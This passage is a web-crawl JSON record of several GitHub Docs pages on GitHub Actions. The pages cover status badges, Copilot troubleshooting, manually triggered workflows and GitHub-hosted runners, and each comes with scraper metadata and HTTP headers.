      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "580E:140A86:BE93A8:F8DC21:681C3953",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "6338",
      "date": "Thu, 08 May 2025 06:41:26 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000045-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686486.085395,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Adding a workflow status badge\nYou can display a status badge in your repository to indicate the status of your workflows.\nNote\nWorkflow badges in a private repository are not accessible externally, so you won't be able to embed them or link to them from an external site.\nA status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in the README.md file of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using the branch and event query parameters in the URL.\nTo add a workflow status badge to your README.md file, first find the URL for the status badge you would like to display. Then you can use Markdown to display the badge as an image in your README.md file. For more information about image markup in Markdown, see Basic writing and formatting syntax.\nUsing the UI\nYou can create a workflow status badge directly on the UI using the workflow file name, branch parameter, and event parameter.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nOn the right side of the page, next to the \"Filter workflow runs\" field, click to display a dropdown menu and click Create status badge.\nOptionally, select a branch if you want to display the status badge for a branch different from the default branch.\nOptionally, select the event that will trigger the workflow.\nClick Copy status badge Markdown.\nCopy the Markdown into your README.md file.\nUsing the workflow file name\nYou can build the URL for a workflow status badge using the name of the workflow file:\nhttps://github.com/OWNER/REPOSITORY/actions/workflows/WORKFLOW-FILE/badge.svg \nTo display the workflow status badge in your README.md file, use the Markdown markup for embedding images. For more information about image markup in Markdown, see Basic writing and formatting syntax.\nFor example, add the following Markdown to your README.md file to add a status badge for a workflow with the file path .github/workflows/main.yml. The OWNER of the repository is the github organization and the REPOSITORY name is docs.\n![example workflow](https://github.com/github/docs/actions/workflows/main.yml/badge.svg) \nUsing the branch parameter\nTo display the status of a workflow run for a specific branch, add ?branch=BRANCH-NAME to the end of the status badge URL.\nFor example, add the following Markdown to your README.md file to display a status badge for a branch with the name feature-1.\n![example branch parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?branch=feature-1) \nUsing the event parameter\nTo display the status of workflow runs triggered by the push event, add ?event=push to the end of the status badge URL.\nFor example, add the following Markdown to your README.md file to display a badge with the status of workflow runs triggered by the push event, which will show the status of the build for the current state of that branch.\n![example event parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?event=push)",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-h25dsi.html",
  "markdown": "# Adding a workflow status badge\n\nYou can display a status badge in your repository to indicate the status of your workflows.\n\nNote\n\nWorkflow badges in a private repository are not accessible externally, so you won't be able to embed them or link to them from an external site.\n\nA status badge shows whether a workflow is currently failing or passing. A common place to add a status badge is in the `README.md` file of your repository, but you can add it to any web page you'd like. By default, badges display the status of your default branch. If there are no workflow runs on your default branch, it will display the status of the most recent run across all branches. You can display the status of a workflow run for a specific branch or event using the `branch` and `event` query parameters in the URL.\n\n![Screenshot of a workflow status badge. From right to left it shows: the GitHub logo, workflow name (\"GitHub Actions Demo\"), and status (\"passing\").](https://docs.github.com/assets/cb-16218/images/help/repository/actions-workflow-status-badge.png)\n\nTo add a workflow status badge to your `README.md` file, first find the URL for the status badge you would like to display. Then you can use Markdown to display the badge as an image in your `README.md` file. For more information about image markup in Markdown, see [Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax#images).\n\n## [Using the UI](#using-the-ui)\n\nYou can create a workflow status badge directly on the UI using the workflow file name, branch parameter, and event parameter.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  On the right side of the page, next to the \"Filter workflow runs\" field, click to display a dropdown menu and click **Create status badge**.\n    \n5.  Optionally, select a branch if you want to display the status badge for a branch different from the default branch.\n    \n6.  Optionally, select the event that will trigger the workflow.\n    \n7.  Click **Copy status badge Markdown**.\n    \n8.  Copy the Markdown into your `README.md` file.\n    \n\n## [Using the workflow file name](#using-the-workflow-file-name)\n\nYou can build the URL for a workflow status badge using the name of the workflow file:\n\n```\nhttps://github.com/OWNER/REPOSITORY/actions/workflows/WORKFLOW-FILE/badge.svg\n```\n\nTo display the workflow status badge in your `README.md` file, use the Markdown markup for embedding images. For more information about image markup in Markdown, see [Basic writing and formatting syntax](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax#images).\n\nFor example, add the following Markdown to your `README.md` file to add a status badge for a workflow with the file path `.github/workflows/main.yml`. The `OWNER` of the repository is the `github` organization and the `REPOSITORY` name is `docs`.\n\n```\n![example workflow](https://github.com/github/docs/actions/workflows/main.yml/badge.svg)\n```\n\n## [Using the `branch` parameter](#using-the-branch-parameter)\n\nTo display the status of a workflow run for a specific branch, add `?branch=BRANCH-NAME` to the end of the status badge URL.\n\nFor example, add the following Markdown to your `README.md` file to display a status badge for a branch with the name `feature-1`.\n\n```\n![example branch parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?branch=feature-1)\n```\n\n## [Using the `event` parameter](#using-the-event-parameter)\n\nTo display the status of workflow runs triggered by the `push` event, add `?event=push` to the end of the status badge URL.\n\nFor example, add the following Markdown to your `README.md` file to display a badge with the status of workflow runs triggered by the `push` event, which will show the status of the build for the current state of that branch.\n\n```\n![example event parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?event=push)\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 209,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-adding-a-workflow-status-badge-readableTextIfPossible"
    },
    "lengths": {
      "extractus": 6691,
      "readableText": 6326,
      "none": 8488,
      "readableTextIfPossible": 8488,
      "result": 6326,
      "markdown": 4669
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows",
    "loadedTime": "2025-05-08T06:41:30.333Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows",
    "title": "Using Copilot to troubleshoot workflows - GitHub Docs",
    "description": "You can use GitHub Copilot to help resolve failed workflow runs.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using Copilot to troubleshoot workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "25110",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "228E:1F18CA:FDDDA5:147010E:681C5218",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:41:30 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000045-IAD",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686489.723840,VS0,VE1559",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Using Copilot to troubleshoot workflows\nYou can use GitHub Copilot to help resolve failed workflow runs.\nWho can use this feature?\nThis feature is available for users on all GitHub Copilot subscription tiers.\nIf a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error.\nTo open a chat about a failed workflow run, you can either:\nNext to the failed check in the merge box, click , then click Explain error.\nIn the merge box, click on the failed check. At the top of the workflow run summary page, click Explain error.\nThis opens a chat window with GitHub Copilot, where it will provide instructions to resolve the issue.\nNote\nIf you are on a GitHub Copilot Free subscription, this will count towards your monthly chat message limit.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-qutq.html",
  "markdown": "# Using Copilot to troubleshoot workflows\n\nYou can use GitHub Copilot to help resolve failed workflow runs.\n\n## Who can use this feature?\n\nThis feature is available for users on all GitHub Copilot subscription tiers.\n\nIf a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error.\n\nTo open a chat about a failed workflow run, you can either:\n\n*   Next to the failed check in the merge box, click , then click **Explain error**.\n*   In the merge box, click on the failed check. At the top of the workflow run summary page, click **Explain error**.\n\nThis opens a chat window with GitHub Copilot, where it will provide instructions to resolve the issue.\n\nNote\n\nIf you are on a GitHub Copilot Free subscription, this will count towards your monthly chat message limit.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 199,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-original",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-removedE",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-extractu",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-readable",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-using-copilot-to-troubleshoot-workflows-readable"
    },
    "lengths": {
      "extractus": 962,
      "readableText": 1300,
      "none": 2939,
      "readableTextIfPossible": 2939,
      "result": 1300,
      "markdown": 802
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow",
    "loadedTime": "2025-05-08T06:41:45.991Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow",
    "title": "Manually running a workflow - GitHub Docs",
    "description": "When a workflow is configured to run on the workflow_dispatch event, you can run the workflow using the Actions tab on GitHub, GitHub CLI, or the REST API.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Manually running a workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "CD8C:119C4F:102DE7:16621F:681BF145",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "24772",
      "date": "Thu, 08 May 2025 06:41:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21993-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686504.005996, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27279",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Manually running a workflow - GitHub Docs\nWhen a workflow is configured to run on the workflow_dispatch event, you can run the workflow using the Actions tab on GitHub, GitHub CLI, or the REST API.\nConfiguring a workflow to run manually\nTo run a workflow manually, the workflow must be configured to run on the workflow_dispatch event.\nTo trigger the workflow_dispatch event, your workflow must be in the default branch. For more information about configuring the workflow_dispatch event, see Events that trigger workflows.\nWrite access to the repository is required to perform these steps.\nRunning a workflow\nRunning a workflow using the REST API\nWhen using the REST API, you configure the inputs and ref as request body parameters. If the inputs are omitted, the default values defined in the workflow file are used.\nNote\nYou can define up to 10 inputs for a workflow_dispatch event.\nFor more information about using the REST API, see REST API endpoints for workflows.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-45qke.html",
  "markdown": "# Manually running a workflow - GitHub Docs\n\nWhen a workflow is configured to run on the `workflow_dispatch` event, you can run the workflow using the Actions tab on GitHub, GitHub CLI, or the REST API.\n\n## [Configuring a workflow to run manually](#configuring-a-workflow-to-run-manually)\n\nTo run a workflow manually, the workflow must be configured to run on the `workflow_dispatch` event.\n\nTo trigger the `workflow_dispatch` event, your workflow must be in the default branch. For more information about configuring the `workflow_dispatch` event, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_dispatch).\n\nWrite access to the repository is required to perform these steps.\n\n## [Running a workflow](#running-a-workflow)\n\n## [Running a workflow using the REST API](#running-a-workflow-using-the-rest-api)\n\nWhen using the REST API, you configure the `inputs` and `ref` as request body parameters. If the inputs are omitted, the default values defined in the workflow file are used.\n\nNote\n\nYou can define up to 10 `inputs` for a `workflow_dispatch` event.\n\nFor more information about using the REST API, see [REST API endpoints for workflows](https://docs.github.com/en/rest/actions/workflows#create-a-workflow-dispatch-event).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 239,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-manually-running-a-workflow-readableTextIfPossibleHtm"
    },
    "lengths": {
      "extractus": 2063,
      "readableText": 1882,
      "none": 26202,
      "readableTextIfPossible": 26202,
      "result": 1882,
      "markdown": 1304
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners",
    "loadedTime": "2025-05-08T06:41:46.005Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners",
    "title": "About GitHub-hosted runners - GitHub Docs",
    "description": "GitHub offers hosted virtual machines to run workflows. The virtual machine contains an environment of tools, packages, and settings available for GitHub Actions to use.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About GitHub-hosted runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8040:1E7C60:13969:1AFEC:681BE6C9",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "27486",
      "date": "Thu, 08 May 2025 06:41:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21993-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686504.205675, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "36073",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About GitHub-hosted runners - GitHub Docs\nGitHub offers hosted virtual machines to run workflows. The virtual machine contains an environment of tools, packages, and settings available for GitHub Actions to use.\nOverview of GitHub-hosted runners\nRunners are the machines that execute jobs in a GitHub Actions workflow. For example, a runner can clone your repository locally, install testing software, and then run commands that evaluate your code.\nGitHub provides runners that you can use to run your jobs, or you can host your own runners. Each GitHub-hosted runner is a new virtual machine (VM) hosted by GitHub with the runner application and other tools preinstalled, and is available with Ubuntu Linux, Windows, or macOS operating systems. When you use a GitHub-hosted runner, machine maintenance and upgrades are taken care of for you.\nYou can choose one of the standard GitHub-hosted runner options or, if you are on the GitHub Team or GitHub Enterprise Cloud plan, you can provision a runner with more cores, or a runner that's powered by a GPU processor. These machines are referred to as \"larger runner.\" For more information, see About larger runners.\nUsing GitHub-hosted runners requires network access with at least 70 kilobits per second upload and download speeds.\nUsing a GitHub-hosted runner\nTo use a GitHub-hosted runner, create a job and use runs-on to specify the type of runner that will process the job, such as ubuntu-latest, windows-latest, or macos-latest. For the full list of runner types, see About GitHub-hosted runners. If you have repo: write access to a repository, you can view a list of the runners available to use in workflows in the repository. For more information, see Viewing available runners for a repository.\nWhen the job begins, GitHub automatically provisions a new VM for that job. All steps in the job execute on the VM, allowing the steps in that job to share information using the runner's filesystem. You can run workflows directly on the VM or in a Docker container. When the job has finished, the VM is automatically decommissioned.\nThe following diagram demonstrates how two jobs in a workflow are executed on two different GitHub-hosted runners.\nThe following example workflow has two jobs, named Run-npm-on-Ubuntu and Run-PSScriptAnalyzer-on-Windows. When this workflow is triggered, GitHub provisions a new virtual machine for each job.\nThe job named Run-npm-on-Ubuntu is executed on a Linux VM, because the job's runs-on: specifies ubuntu-latest.\nThe job named Run-PSScriptAnalyzer-on-Windows is executed on a Windows VM, because the job's runs-on: specifies windows-latest.\nYAML\nname: Run commands on different operating systems on: push: branches: [ main ] pull_request: branches: [ main ] jobs: Run-npm-on-Ubuntu: name: Run npm on Ubuntu runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '14' - run: npm help Run-PSScriptAnalyzer-on-Windows: name: Run PSScriptAnalyzer on Windows runs-on: windows-latest steps: - uses: actions/checkout@v4 - name: Install PSScriptAnalyzer module shell: pwsh run: | Set-PSRepository PSGallery -InstallationPolicy Trusted Install-Module PSScriptAnalyzer -ErrorAction Stop - name: Get list of rules shell: pwsh run: | Get-ScriptAnalyzerRule \nWhile the job runs, the logs and output can be viewed in the GitHub UI:\nThe GitHub Actions runner application is open source. You can contribute and file issues in the runner repository.\nViewing available runners for a repository\nIf you have repo: write access to a repository, you can view a list of the runners available to the repository.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, under the \"Management\" section, click Runners.\nReview the list of available GitHub-hosted runners for the repository.\nOptionally, to copy a runner's label to use it in a workflow, click to the right of the runner, then click Copy label.\nNote\nEnterprise and organization owners can create runners from this page. To create a new runner, click New runner at the top right of the list of runners to add runners to the repository.\nFor more information, see Managing larger runners and Adding self-hosted runners.\nSupported runners and hardware resources\nRanges of GitHub-hosted runners are available for use in public and private repositories.\nFor lists of available runners, see:\nStandard runners for public repositories\nStandard runners for private repositories\nGitHub-hosted Linux runners support hardware acceleration for Android SDK tools, which makes running Android tests much faster and consumes fewer minutes. For more information on Android hardware acceleration, see Configure hardware acceleration for the Android Emulator in the Android Developers documentation.\nNote\nThe -latest runner images are the latest stable images that GitHub provides, and might not be the most recent version of the operating system available from the operating system vendor.\nWarning\nBeta and Deprecated Images are provided \"as-is\", \"with all faults\" and \"as available\" and are excluded from the service level agreement and warranty. Beta Images may not be covered by customer support.\nStandard GitHub-hosted runners for public repositories\nFor public repositories, jobs using the workflow labels shown in the table below will run on virtual machines with the associated specifications. The use of these runners on public repositories is free and unlimited.\nVirtual Machine Processor (CPU) Memory (RAM) Storage (SSD) Architecture Workflow label \nLinux\t4\t16 GB\t14 GB\tx64 \tubuntu-latest, ubuntu-24.04, ubuntu-22.04 \t\nWindows\t4\t16 GB\t14 GB\tx64 \twindows-latest, windows-2025, windows-2022, windows-2019 \t\nLinux [Public preview]\t4\t16 GB\t14 GB\tarm64 \tubuntu-24.04-arm, ubuntu-22.04-arm \t\nWindows [Public preview]\t4\t16 GB\t14 GB\tarm64\twindows-11-arm \t\nmacOS\t4\t14 GB\t14 GB\tIntel \tmacos-13 \t\nmacOS\t3 (M1)\t7 GB\t14 GB\tarm64 \tmacos-latest, macos-14, macos-15 \t\nNote\nThe arm64 Linux and Windows runners are in public preview and subject to change.\nStandard GitHub-hosted runners for private repositories\nFor private repositories, 